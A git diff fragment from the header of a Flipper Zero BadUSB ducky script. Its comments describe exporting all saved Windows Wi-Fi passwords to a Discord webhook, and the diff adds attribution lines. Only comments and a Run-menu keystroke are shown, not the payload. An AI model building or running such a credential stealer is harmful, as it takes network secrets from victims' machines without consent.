@@ -2,6 +2,8 @@ REM This script is a ducky script to be run on a windows machine with a Flipper 
 REM It contains a powershell script that exports all saved wifi passwords to a discord webhook
 REM This script is for educational purposes only
 REM To Get Discord Web URL Please visit https://github.com/wmlsandaruwan/FlipperZeroWifiPassStealer
+REM This code is based on a Gist by AlexZeGamer: https://gist.github.com/AlexZeGamer/c7269927335d152cc28d31022c00882e
+REM Modifications were made by W M L Sandaruwan.
 
 REM Opening powershell from the run menu
     GUI r
